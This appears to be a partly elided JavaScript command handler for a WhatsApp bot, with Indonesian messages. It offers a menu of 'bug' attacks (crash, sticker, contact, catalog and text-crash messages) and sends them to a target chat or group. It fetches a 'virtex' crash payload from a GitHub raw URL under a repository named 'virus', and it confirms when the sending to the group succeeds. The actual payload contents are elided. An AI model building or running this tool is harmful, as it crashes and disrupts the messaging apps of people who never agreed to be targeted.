...
let handler = async (
  m,
  { conn, args, text, command, usedPrefix, participants }
) => {
  let who =
  ...
  let viruswan = await (
    await fetch(
      "https://raw.githubusercontent.com/WannBotz/virus/main/virtex1.txt"
    )
  ).text();
  ...
  let sections = [
    {
      ...
      rows: [
        ...
        {
          title: "Bug Sticker",
          rowId: `${usedPrefix + command} sticker ${text}`,
        },
        { title: "Bug Image", rowId: `${usedPrefix + command} bugimg ${text}` },
        { title: "Bug Video", rowId: `${usedPrefix + command} bugvid ${text}` },
        {
          title: "Bug Crash",
          rowId: `${usedPrefix + command} bugcrash ${text}`,
        },
        {
          title: "BugKontak",
          rowId: `${usedPrefix + command} bugkontak ${text}`,
        },
        {
          title: "Bug ReactPc",
          rowId: `${usedPrefix + command} reactpc ${text}`,
        },
        {
          title: "Bug Catalog",
          rowId: `${usedPrefix + command} bugcatalog ${text}`,
        },
        {
          title: "Bug TextCrash",
          rowId: `${usedPrefix + command} bugtextcrash ${text}`,
        },
      ],
    },
  ];
  ...
  switch (type) {
    ...
    case "bugkontak":
      {
        let res = await generateWAMessageFromContent(
          target,
          {
            contactMessage: {
              vcard: "HAHaAhHAHAHA",
    ...
    case "bugcatalog":
      {
        conn.relayMessage(target, catalog.message, {
  ...
  conn.sendButtonDoc(
    m.chat,
    gcname,
    `*Sukses Mengirim Ke Group ${gcname}\n\n${botdate}`,
    "Bug Menu",
    ".? bugmenu",
    fkontak
  );
